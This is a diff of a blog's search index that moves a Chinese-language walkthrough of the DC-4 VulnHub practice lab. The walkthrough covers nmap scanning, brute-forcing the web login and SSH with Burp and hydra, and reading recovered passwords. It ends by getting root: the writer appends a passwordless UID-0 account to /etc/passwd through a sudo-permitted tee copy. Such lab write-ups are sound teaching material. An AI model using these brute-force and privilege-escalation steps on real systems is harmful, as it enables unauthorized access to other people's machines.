@@ -1,117 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>DC-4</title>
-    <url>/2020/08/23/DC-4/</url>
-    <content><![CDATA[<h2 id="0x00-官网描述"><a href="#0x00-官网描述" class="headerlink" title="0x00.官网描述"></a>0x00.官网描述</h2><blockquote>
-<p>DC-4 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</p>
-<p>Unlike the previous DC releases, this one is designed primarily for beginners/intermediates. There is only one flag, but technically, multiple entry points and just like last time, no clues.</p>
-<p>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</p>
-<p>For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won’t give you the answer, instead, I’ll give you an idea about how to move forward.</p>
-<p><strong>DC-3之后不再有提示信息，只有一个最终flag</strong></p>
-</blockquote>
-<a id="more"></a>
-
-<h2 id="0x01-老规矩上nmap"><a href="#0x01-老规矩上nmap" class="headerlink" title="0x01.老规矩上nmap"></a>0x01.老规矩上nmap</h2><p><code>可以发现1为网关，2为宿主机，6为kali，那么3就是我们的受害者</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC4<span class="comment"># nmap -sP 192.168.1.0/24 -oN nmap.sP</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-22 21:44 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.1</span><br><span class="line">Host is up (0.0020s latency).</span><br><span class="line">MAC Address: 68:D1:BA:1F:FD:48 (Shenzhen Youhua Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.2</span><br><span class="line">Host is up (0.00029s latency).</span><br><span class="line">MAC Address: 50:5B:C2:8C:BE:A5 (Liteon Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.3</span><br><span class="line">Host is up (0.00027s latency).</span><br><span class="line">MAC Address: 00:0C:29:B7:2E:67 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.6</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="keyword">in</span> 2.15 seconds</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x02-继续nmap扫描服务及端口"><a href="#0x02-继续nmap扫描服务及端口" class="headerlink" title="0x02.继续nmap扫描服务及端口"></a>0x02.继续nmap扫描服务及端口</h2><p><code>发现开放了22/80端口</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC4<span class="comment"># nmap -A 192.168.1.3 -oN nmap.A</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-22 21:46 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.3</span><br><span class="line">Host is up (0.00034s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)</span><br><span class="line">|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)</span><br><span class="line">|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.15.10</span><br><span class="line">|_http-server-header: nginx/1.15.10</span><br><span class="line">|_http-title: System Tools</span><br><span class="line">MAC Address: 00:0C:29:B7:2E:67 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.34 ms 192.168.1.3</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.53 seconds</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x03-访问80端口"><a href="#0x03-访问80端口" class="headerlink" title="0x03.访问80端口"></a>0x03.访问80端口</h2><p><code>发现只有一个admin登入框</code></p>
-<img src="/2020/08/23/DC-4/image-20200823095457714.png" class>
-
-<h2 id="0x04-使用bp爆破"><a href="#0x04-使用bp爆破" class="headerlink" title="0x04.使用bp爆破"></a>0x04.使用bp爆破</h2><h3 id="1-抓包"><a href="#1-抓包" class="headerlink" title="1.抓包"></a>1.抓包</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /login.php HTTP/1.1</span><br><span class="line">Host: 192.168.1.3</span><br><span class="line">Content-Length: 29</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://192.168.1.3</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://192.168.1.3/index.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: has_js=1; SESS3d56985a7fb178e8eb469ddb59bb6550=6flnn9PeYpt0eXlfkyxJlP9vjJwA3UhQ4nszAdkawro; Drupal.toolbar.collapsed=0; PHPSESSID=cdfml2498srtgu1effus59caj4</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">username=admin&amp;password=admin</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-爆破密码"><a href="#2-爆破密码" class="headerlink" title="2.爆破密码"></a>2.爆破密码</h3><img src="/2020/08/23/DC-4/image-20200823100752772.png" class>
-
-<p><code>添加字典</code></p>
-<blockquote>
-<p>字典为：</p>
-<p>/usr/share/john/password.lst</p>
-</blockquote>
-<img src="/2020/08/23/DC-4/image-20200823100842693.png" class>
-
-<p><code>添加线程数</code></p>
-<img src="/2020/08/23/DC-4/image-20200823100909253.png" class>
-
-<p><code>爆破，得到admin密码</code></p>
-<img src="/2020/08/23/DC-4/image-20200823101419431.png" class>
-
-<h2 id="0x05-登入"><a href="#0x05-登入" class="headerlink" title="0x05.登入"></a>0x05.登入</h2><p><code>发现两个按钮</code></p>
-<img src="/2020/08/23/DC-4/image-20200823101705004.png" class>
-
-<p><code>点击，查看</code></p>
-<img src="/2020/08/23/DC-4/image-20200823101759883.png" class>
-
-<img src="/2020/08/23/DC-4/image-20200823101819698.png" class>
-
-<img src="/2020/08/23/DC-4/image-20200823101834283.png" class>
-
-<h2 id="0x06-继续抓包，查看命令是如何执行的"><a href="#0x06-继续抓包，查看命令是如何执行的" class="headerlink" title="0x06.继续抓包，查看命令是如何执行的"></a>0x06.继续抓包，查看命令是如何执行的</h2><img src="/2020/08/23/DC-4/image-20200823102447148.png" class>
-
-<p><code>更换其他系统命令，可以执行，判断存在命令注入漏洞，并发现了几个用户</code></p>
-<img src="/2020/08/23/DC-4/image-20200823102752407.png" class>
-
-<p><code>查看home目录</code></p>
-<img src="/2020/08/23/DC-4/image-20200823103524956.png" class>
-
-<p><code>每个家目录都查看一下，发现一个old-passwords.bak</code></p>
-<img src="/2020/08/23/DC-4/image-20200823103748208.png" class>
-
-<p><code>将用户与密码编辑为字典用于爆破</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC4<span class="comment"># ls</span></span><br><span class="line">nmap.A  nmap.sP  old-passwords.bak  users.bak</span><br><span class="line">root@JIYE:~/tmp/DC4<span class="comment"># </span></span><br></pre></td></tr></table></figure>
-
-<h2 id="0x07-ssh爆破"><a href="#0x07-ssh爆破" class="headerlink" title="0x07.ssh爆破"></a>0x07.ssh爆破</h2><p><code>由于开放了ssh端口，可以进行ssh爆破</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC4<span class="comment"># hydra -L users.bak -P old-passwords.bak ssh://192.168.1.3 -vV -f -o hydra.ssh</span></span><br></pre></td></tr></table></figure>
-
-<p><code>爆破成功一个用户</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC4<span class="comment"># cat hydra.ssh </span></span><br><span class="line"><span class="comment"># Hydra v9.1 run at 2020-08-22 22:49:20 on 192.168.1.3 ssh (hydra -L users.bak -P old-passwords.bak -vV -f -o hydra.ssh ssh://192.168.1.3)</span></span><br><span class="line">[22][ssh] host: 192.168.1.3   login: jim   password: jibril04</span><br><span class="line">root@JIYE:~/tmp/DC4<span class="comment">#</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="0x08-ssh登入"><a href="#0x08-ssh登入" class="headerlink" title="0x08.ssh登入"></a>0x08.ssh登入</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC4<span class="comment"># ssh jim@192.168.1.3</span></span><br><span class="line">jim@192.168.1.3<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Debian GNU/Linux system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="string">permitted by applicable law.</span></span><br><span class="line"><span class="string">You have mail.</span></span><br><span class="line"><span class="string">Last login: Sun Aug 23 13:35:56 2020 from 192.168.1.6</span></span><br><span class="line"><span class="string">jim@dc-4:~$ whoami</span></span><br><span class="line"><span class="string">jim</span></span><br><span class="line"><span class="string">jim@dc-4:~$ </span></span><br></pre></td></tr></table></figure>
-
-<p><code>检查文件，发现一封来自root的邮件</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jim@dc-4:~$ ls -l</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups</span><br><span class="line">-rw------- 1 jim jim  528 Apr  6  2019 mbox</span><br><span class="line">-rwsrwxrwx 1 jim jim  174 Apr  6  2019 test.sh</span><br><span class="line">jim@dc-4:~$ cat mbox </span><br><span class="line">From root@dc-4 Sat Apr 06 20:20:04 2019</span><br><span class="line">Return-path: &lt;root@dc-4&gt;</span><br><span class="line">Envelope-to: jim@dc-4</span><br><span class="line">Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">Received: from root by dc-4 with <span class="built_in">local</span> (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-4&gt;)</span><br><span class="line">        id 1hCiQe-0000gc-EC</span><br><span class="line">        <span class="keyword">for</span> jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">To: jim@dc-4</span><br><span class="line">Subject: Test</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Message-Id: &lt;E1hCiQe-0000gc-EC@dc-4&gt;</span><br><span class="line">From: root &lt;root@dc-4&gt;</span><br><span class="line">Date: Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">Status: RO</span><br><span class="line"></span><br><span class="line">This is a <span class="built_in">test</span>.</span><br></pre></td></tr></table></figure>
-
-<p><code>根据思路查看还有没有其他邮件，结果得到charles的密码</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jim@dc-4:~$ <span class="built_in">cd</span> /var/mail/</span><br><span class="line">jim@dc-4:/var/mail$ ls -l</span><br><span class="line">total 4</span><br><span class="line">-rw-rw---- 1 jim mail 715 Apr  6  2019 jim</span><br><span class="line">jim@dc-4:/var/mail$ </span><br><span class="line">jim@dc-4:/var/mail$ </span><br><span class="line">jim@dc-4:/var/mail$ cat jim </span><br><span class="line">From charles@dc-4 Sat Apr 06 21:15:46 2019</span><br><span class="line">Return-path: &lt;charles@dc-4&gt;</span><br><span class="line">Envelope-to: jim@dc-4</span><br><span class="line">Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000</span><br><span class="line">Received: from charles by dc-4 with <span class="built_in">local</span> (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;charles@dc-4&gt;)</span><br><span class="line">        id 1hCjIX-0000kO-Qt</span><br><span class="line">        <span class="keyword">for</span> jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000</span><br><span class="line">To: jim@dc-4</span><br><span class="line">Subject: Holidays</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Message-Id: &lt;E1hCjIX-0000kO-Qt@dc-4&gt;</span><br><span class="line">From: Charles &lt;charles@dc-4&gt;</span><br><span class="line">Date: Sat, 06 Apr 2019 21:15:45 +1000</span><br><span class="line">Status: O</span><br><span class="line"></span><br><span class="line">Hi Jim,</span><br><span class="line"></span><br><span class="line">I<span class="string">&#x27;m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Password is:  ^xHhA&amp;hvim0y</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">See ya,</span></span><br><span class="line"><span class="string">Charles</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">jim@dc-4:/var/mail$</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="0x09-提权"><a href="#0x09-提权" class="headerlink" title="0x09.提权"></a>0x09.提权</h2><h3 id="1-使用sudo-l"><a href="#1-使用sudo-l" class="headerlink" title="1.使用sudo -l"></a>1.使用sudo -l</h3><p><code>jim用户不能使用sudo -l</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jim@dc-4:~$ sudo -l</span><br><span class="line"></span><br><span class="line">We trust you have received the usual lecture from the <span class="built_in">local</span> System</span><br><span class="line">Administrator. It usually boils down to these three things:</span><br><span class="line"></span><br><span class="line">    <span class="comment">#1) Respect the privacy of others.</span></span><br><span class="line">    <span class="comment">#2) Think before you type.</span></span><br><span class="line">    <span class="comment">#3) With great power comes great responsibility.</span></span><br><span class="line"></span><br><span class="line">[sudo] password <span class="keyword">for</span> jim: </span><br><span class="line">Sorry, user jim may not run sudo on dc-4.</span><br><span class="line">jim@dc-4:~$</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-切换charles用户"><a href="#2-切换charles用户" class="headerlink" title="2.切换charles用户"></a>2.切换charles用户</h3><p><code>发现可以使用teehee命令提权</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># ssh charles@192.168.1.3</span></span><br><span class="line">charles@192.168.1.3<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Debian GNU/Linux system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="string">permitted by applicable law.</span></span><br><span class="line"><span class="string">charles@dc-4:~$ sudo -l</span></span><br><span class="line"><span class="string">Matching Defaults entries for charles on dc-4:</span></span><br><span class="line"><span class="string">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">User charles may run the following commands on dc-4:</span></span><br><span class="line"><span class="string">    (root) NOPASSWD: /usr/bin/teehee</span></span><br><span class="line"><span class="string">charles@dc-4:~$</span></span><br></pre></td></tr></table></figure>
-
-<p><code>查看teehee参数，发现-a参数为追加文件且不覆盖</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">charles@dc-4:~$ teehee --<span class="built_in">help</span></span><br><span class="line">Usage: teehee [OPTION]... [FILE]...</span><br><span class="line">Copy standard input to each FILE, and also to standard output.</span><br><span class="line"></span><br><span class="line">  -a, --append              append to the given FILEs, <span class="keyword">do</span> not overwrite</span><br><span class="line">  -i, --ignore-interrupts   ignore interrupt signals</span><br><span class="line">  -p                        diagnose errors writing to non pipes</span><br><span class="line">      --output-error[=MODE]   <span class="built_in">set</span> behavior on write error.  See MODE below</span><br><span class="line">      --<span class="built_in">help</span>     display this <span class="built_in">help</span> and <span class="built_in">exit</span></span><br><span class="line">      --version  output version information and <span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line">MODE determines behavior with write errors on the outputs:</span><br><span class="line">  <span class="string">&#x27;warn&#x27;</span>         diagnose errors writing to any output</span><br><span class="line">  <span class="string">&#x27;warn-nopipe&#x27;</span>  diagnose errors writing to any output not a pipe</span><br><span class="line">  <span class="string">&#x27;exit&#x27;</span>         <span class="built_in">exit</span> on error writing to any output</span><br><span class="line">  <span class="string">&#x27;exit-nopipe&#x27;</span>  <span class="built_in">exit</span> on error writing to any output not a pipe</span><br><span class="line">The default MODE <span class="keyword">for</span> the -p option is <span class="string">&#x27;warn-nopipe&#x27;</span>.</span><br><span class="line">The default operation when --output-error is not specified, is to</span><br><span class="line"><span class="built_in">exit</span> immediately on error writing to a pipe, and diagnose errors</span><br><span class="line">writing to non pipe outputs.</span><br><span class="line"></span><br><span class="line">GNU coreutils online <span class="built_in">help</span>: &lt;http://www.gnu.org/software/coreutils/&gt;</span><br><span class="line">Full documentation at: &lt;http://www.gnu.org/software/coreutils/tee&gt;</span><br><span class="line">or available locally via: info <span class="string">&#x27;(coreutils) tee invocation&#x27;</span></span><br><span class="line">charles@dc-4:~$ </span><br></pre></td></tr></table></figure>
-
-<h3 id="3-teehee提权"><a href="#3-teehee提权" class="headerlink" title="3.teehee提权"></a>3.teehee提权</h3><p><code>向/etc/passwd追加文件</code></p>
-<blockquote>
-<p>/etc/passwd文件一共有7个字段</p>
-<p>第一个字段代表用户名；</p>
-<p>第二个字段代表是否有密码保护；</p>
-<p>第三个字段表示UID，为0表示root用户；</p>
-<p>第四个字段表示GID；</p>
-<p>第五个字段表示用户全称；</p>
-<p>第六个字段表示用户家目录；</p>
-<p>第七个字段表示用什么shell来解析执行</p>
-</blockquote>
-<p><code>为root用户添加别名</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">charles@dc-4:~$ <span class="built_in">echo</span> <span class="string">&quot;fjy::0:0:::/bin/bash&quot;</span> | sudo teehee -a /etc/passwd</span><br><span class="line">fjy::0:0:::/bin/bash</span><br><span class="line">charles@dc-4:~$ cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/<span class="literal">false</span></span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/<span class="literal">false</span></span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/<span class="literal">false</span></span><br><span class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/<span class="literal">false</span></span><br><span class="line">_apt:x:104:65534::/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">messagebus:x:105:109::/var/run/dbus:/bin/<span class="literal">false</span></span><br><span class="line">sshd:x:106:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">nginx:x:107:111:nginx user,,,:/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash</span><br><span class="line">jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash</span><br><span class="line">sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash</span><br><span class="line">Debian-exim:x:108:112::/var/spool/exim4:/bin/<span class="literal">false</span></span><br><span class="line">fjy::0:0:::/bin/bash</span><br><span class="line">charles@dc-4:~$ </span><br></pre></td></tr></table></figure>
-
-<p><code>登入</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">charles@dc-4:~$ su fjy</span><br><span class="line">root@dc-4:/home/charles<span class="comment"># cd</span></span><br><span class="line">root@dc-4:/root<span class="comment"># ls</span></span><br><span class="line">flag.txt</span><br><span class="line">root@dc-4:/root<span class="comment"># cat flag.txt </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">888       888          888 888      8888888b.                             888 888 888 888 </span><br><span class="line">888   o   888          888 888      888  <span class="string">&quot;Y88b                            888 888 888 888 </span></span><br><span class="line"><span class="string">888  d8b  888          888 888      888    888                            888 888 888 888 </span></span><br><span class="line"><span class="string">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span></span><br><span class="line"><span class="string">888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;</span><span class="string">&quot;88b 888 &quot;</span>88b d8P  Y8b 888 888 888 888 </span><br><span class="line">88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      <span class="string">&quot;   &quot;</span>   <span class="string">&quot;   &quot;</span>  </span><br><span class="line">888P     Y888  <span class="string">&quot;Y8888  888 888      8888888P&quot;</span>   <span class="string">&quot;Y88P&quot;</span>  888  888  <span class="string">&quot;Y8888  888 888 888 888 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulations!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those</span></span><br><span class="line"><span class="string">who have provided feedback, and who have taken time to complete these little</span></span><br><span class="line"><span class="string">challenges.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">If you enjoyed this CTF, send me a tweet via @DCAU7.</span></span><br><span class="line"><span class="string">root@dc-4:/root# </span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>vulnhub</category>
-        <category>DC</category>
-      </categories>
-      <tags>
-        <tag>靶机</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>DC-5</title>
     <url>/2020/08/24/DC-5/</url>
     <content><![CDATA[<h2 id="0x00-官网描述"><a href="#0x00-官网描述" class="headerlink" title="0x00.官网描述"></a>0x00.官网描述</h2><blockquote>
@@ -243,6 +132,117 @@
       </tags>
   </entry>
   <entry>
+    <title>DC-4</title>
+    <url>/2020/08/23/DC-4/</url>
+    <content><![CDATA[<h2 id="0x00-官网描述"><a href="#0x00-官网描述" class="headerlink" title="0x00.官网描述"></a>0x00.官网描述</h2><blockquote>
+<p>DC-4 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</p>
+<p>Unlike the previous DC releases, this one is designed primarily for beginners/intermediates. There is only one flag, but technically, multiple entry points and just like last time, no clues.</p>
+<p>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</p>
+<p>For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won’t give you the answer, instead, I’ll give you an idea about how to move forward.</p>
+<p><strong>DC-3之后不再有提示信息，只有一个最终flag</strong></p>
+</blockquote>
+<a id="more"></a>
+
+<h2 id="0x01-老规矩上nmap"><a href="#0x01-老规矩上nmap" class="headerlink" title="0x01.老规矩上nmap"></a>0x01.老规矩上nmap</h2><p><code>可以发现1为网关，2为宿主机，6为kali，那么3就是我们的受害者</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC4<span class="comment"># nmap -sP 192.168.1.0/24 -oN nmap.sP</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-22 21:44 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.1</span><br><span class="line">Host is up (0.0020s latency).</span><br><span class="line">MAC Address: 68:D1:BA:1F:FD:48 (Shenzhen Youhua Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.2</span><br><span class="line">Host is up (0.00029s latency).</span><br><span class="line">MAC Address: 50:5B:C2:8C:BE:A5 (Liteon Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.3</span><br><span class="line">Host is up (0.00027s latency).</span><br><span class="line">MAC Address: 00:0C:29:B7:2E:67 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.6</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="keyword">in</span> 2.15 seconds</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-继续nmap扫描服务及端口"><a href="#0x02-继续nmap扫描服务及端口" class="headerlink" title="0x02.继续nmap扫描服务及端口"></a>0x02.继续nmap扫描服务及端口</h2><p><code>发现开放了22/80端口</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC4<span class="comment"># nmap -A 192.168.1.3 -oN nmap.A</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-22 21:46 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.3</span><br><span class="line">Host is up (0.00034s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)</span><br><span class="line">|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)</span><br><span class="line">|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.15.10</span><br><span class="line">|_http-server-header: nginx/1.15.10</span><br><span class="line">|_http-title: System Tools</span><br><span class="line">MAC Address: 00:0C:29:B7:2E:67 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.34 ms 192.168.1.3</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.53 seconds</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-访问80端口"><a href="#0x03-访问80端口" class="headerlink" title="0x03.访问80端口"></a>0x03.访问80端口</h2><p><code>发现只有一个admin登入框</code></p>
+<img src="/2020/08/23/DC-4/image-20200823095457714.png" class>
+
